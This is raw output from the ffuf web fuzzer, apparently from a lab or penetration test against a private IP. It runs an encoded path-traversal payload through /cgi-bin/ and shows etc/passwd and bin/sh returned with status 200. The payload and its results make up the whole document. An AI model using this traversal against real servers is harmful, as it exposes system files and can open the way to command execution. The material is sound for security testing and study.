        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,403
________________________________________________

etc/passwd              [Status: 200, Size: 1147, Words: 92, Lines: 45, Duration: 12ms]
bin/sh                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
:: Progress: [4712/4712] :: Job [1/1] :: 320 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
